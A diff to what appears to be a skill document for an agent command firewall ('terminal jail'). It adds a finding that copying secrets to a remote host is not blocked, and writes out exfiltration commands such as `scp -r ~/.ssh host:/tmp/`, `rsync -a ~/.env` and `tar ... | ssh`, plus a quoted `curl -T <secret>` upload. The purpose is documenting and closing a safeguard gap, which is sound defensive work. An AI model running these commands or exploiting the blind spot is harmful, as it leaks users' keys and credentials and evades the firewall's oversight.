@@ -35,7 +35,7 @@ description: >-
   keep working; the db pack additionally blocks `sed`/`git commit`/read-only
   SELECT of the statement text while `psql -f <file>` that really drops the
   table is allowed — see pitfalls 8-9 and the pack-verification pattern).
-version: 1.8.0
+version: 1.9.0
 category: software-development
 ---
 
@@ -302,7 +302,15 @@ $TJ --user touch /tmp/x   # → COMMAND BLOCKED, rc=126
   `builtin-net-wget-post-file`; whole-tree `rsync`/`scp` (root `/` — also `//`,
   `/*`, `/.`, `~/` — to `host:path`) → `builtin-net-remote-tree-copy`. Inline
   fields/`--form-string`/inline `-d` bodies and plain downloads stay ALLOW, and
-  scoped copies (`rsync -av ~/proj/ host:/srv/`) are untouched. **Only a
+  scoped copies (`rsync -av ~/proj/ host:/srv/`) are untouched. **Scoped
+  SECRET-source copies to a remote host are also ALLOW (DF-TERMINAL-JAIL-29,
+  2026-09-19 evening)**: `scp -r ~/.ssh host:/tmp/`, `scp ~/.env host:`,
+  `rsync -a ~/.ssh host:/x`, `rsync -a -e ssh ~/.env host::mod`, and
+  `tar cf - ~/.ssh | ssh host 'cat > /tmp/x'` (DF-30) all return `allow` /
+  `rule_id: null` — the tree-copy rule arms only on the root-source shape. Until
+  DF-29/30 close, the ssh-family file-copy transport is the firewall's exfil
+  blind spot; treat any `scp`/`rsync`/`ssh` sink command as uncontained on the
+  data-out axis and pre-filter sensitive sources yourself. **Only a
   `block` stops an egress** (DF-TERMINAL-JAIL-20): before the promotion the
   namespace wrap did not restrict the network — measured with a real loopback
   collector, `curl -T <secret> http://127.0.0.1:18777/collect` was rewritten to
